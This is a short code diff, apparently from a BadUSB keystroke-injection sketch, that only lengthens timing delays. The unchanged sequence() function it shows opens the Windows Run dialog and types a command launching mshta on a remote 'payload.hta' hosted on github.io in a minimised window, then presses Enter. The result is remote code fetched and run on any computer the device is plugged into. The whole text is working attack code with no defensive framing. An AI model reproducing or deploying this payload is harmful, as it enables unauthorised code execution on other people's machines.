@@ -11,11 +11,11 @@
 void sequence()
 {
   COMBINATION(KEY_LEFT_GUI, 'r');
-  delay(200);
+  delay(500);
   DELETE;
-  delay(200);
+  delay(500);
   Keyboard.print("cmd /c start /min mshta https://n643064.github.io/payload.hta ^& exit");
-  delay(200);
+  delay(500);
   ENTER;
 }
 
